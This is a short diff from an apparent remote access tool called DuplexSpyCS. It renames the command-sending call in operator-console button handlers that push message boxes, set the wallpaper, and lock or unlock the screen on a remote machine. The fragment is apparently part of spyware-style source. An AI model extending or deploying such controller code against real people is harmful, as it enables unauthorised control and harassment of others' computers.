@@ -93,12 +93,12 @@ namespace DuplexSpyCS
             else if (radioButton2.Checked)
                 mode = "inf|start";
 
-            v.encSend(2, 0, $"fun|msg|{mode}|{clsCrypto.b64E2Str(textBox1.Text)}|{clsCrypto.b64E2Str(textBox2.Text)}|{comboBox1.Text}|{comboBox2.Text.Replace(",", string.Empty)}");
+            v.fnSendCommand($"fun|msg|{mode}|{clsCrypto.b64E2Str(textBox1.Text)}|{clsCrypto.b64E2Str(textBox2.Text)}|{comboBox1.Text}|{comboBox2.Text.Replace(",", string.Empty)}");
         }
 
         private void button3_Click(object sender, EventArgs e)
         {
-            v.encSend(2, 0, "fun|msg|inf|stop");
+            v.fnSendCommand("fun|msg|inf|stop");
         }
 
         private void button12_Click(object sender, EventArgs e)
@@ -146,7 +146,7 @@ namespace DuplexSpyCS
                 return;
             }
 
-            v.encSend(2, 0, "fun|wp|set|" + szImgB64);
+            v.fnSendCommand("fun|wp|set|" + szImgB64);
         }
 
         private void button14_Click(object sender, EventArgs e)
@@ -158,7 +158,7 @@ namespace DuplexSpyCS
                 return;
             }
 
-            v.encSend(2, 0, "fun|screen|lock|" + clsTools.ImageToBase64(filename));
+            v.fnSendCommand("fun|screen|lock|" + clsTools.ImageToBase64(filename));
         }
 
         private void groupBox2_Enter(object sender, EventArgs e)
@@ -173,7 +173,7 @@ namespace DuplexSpyCS
 
         private void button24_Click(object sender, EventArgs e)
         {
-            v.encSend(2, 0, "fun|screen|ulock");
+            v.fnSendCommand("fun|screen|ulock");
         }
 
         //Mouse - Crazy
